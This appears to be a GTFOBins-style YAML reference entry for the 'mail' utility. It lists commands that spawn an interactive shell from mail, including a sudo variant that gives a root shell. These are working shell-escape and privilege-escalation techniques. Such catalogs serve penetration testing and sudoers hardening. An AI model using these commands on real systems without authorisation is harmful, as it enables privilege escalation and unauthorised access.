---
functions:
  shell:
    - description: GNU version only.
      code: mail --exec='!/bin/sh'
    - description: This creates a valid Mbox file which may be required by the binary.
      code: |
        TF=$(mktemp)
        echo "From nobody@localhost $(date)" > $TF
        mail -f $TF
        !/bin/sh
  sudo:
    - description: GNU version only.
      code: sudo mail --exec='!/bin/sh'
---
